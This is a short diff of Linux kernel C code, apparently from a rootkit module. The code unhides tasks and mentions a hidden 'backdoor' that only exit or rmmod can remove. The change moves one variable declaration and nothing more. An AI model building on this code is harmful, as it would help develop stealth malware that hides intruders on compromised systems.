@@ -207,7 +207,6 @@ static void _unhide_children(struct task_struct *task) {
     struct hidden_tasks *node, *node_safe;
 
     list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
-        int status;
         if (node->saddr) {
             if (node->group == task->pid || node->task->pid == task->pid) {
                 prwarn("Fuck-off! backdoor can only be unhidden either by exit or rmmod: %d\n", task->pid);
@@ -216,6 +215,7 @@ static void _unhide_children(struct task_struct *task) {
             continue;
         }
         if (node->group == task->pid) {
+            int status;
             if ((status = stop_machine(_unhide_task, node, NULL))) {
                 prerr("!!!! Error unhide_task %p: %d\n", node->task, status);
             } else {
